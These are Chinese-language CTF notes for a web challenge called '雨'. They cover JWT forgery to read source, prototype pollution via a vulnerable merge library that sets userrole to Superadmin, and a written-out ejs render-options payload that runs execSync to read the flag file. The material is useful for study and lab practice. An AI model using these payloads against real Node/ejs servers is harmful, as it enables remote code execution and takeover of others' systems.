# web
### 雨
#原型链污染 
- 伪造jwt,`/souce`读取源码

- 原型链污染`Super['userrole'] === 'Superadmin'`

https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487
```node
app.all('/create', (req, res) => {
  res.type('html');
  if (!req.body.name || req.body.name === undefined || req.body.name === null){
    res.send("please input name");
  }else {
    if (Super['userrole'] === 'Superadmin') {
        res.render('index', req.body);
      }else {
        if (!safecode(req.body.name)) {
            res.send("你在做什么？快停下！！！")
        }
        else{
            res.render('index', {name: req.body.name});
        }
      }
  }
});
```

`{"constructor": {"prototype": {"polluted": "yes"}}}`
此题中污染
`{"constructor": {"prototype": {"userrole": "Superadmin"}}}`

ejs render第二个参数可控,能进行rce
https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/

chrome hackbar把content-type老是搞不对,post下面这个就行
```json
{"name":"hello","settings":{"view options":{"client":true,"escapeFunction":"(() => {});return process.mainModule.require(\"child_process\").execSync(\"cat /Yupr0m1sing_f1ll4agggXD\").toString()"}}}
```


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-11-16   11:42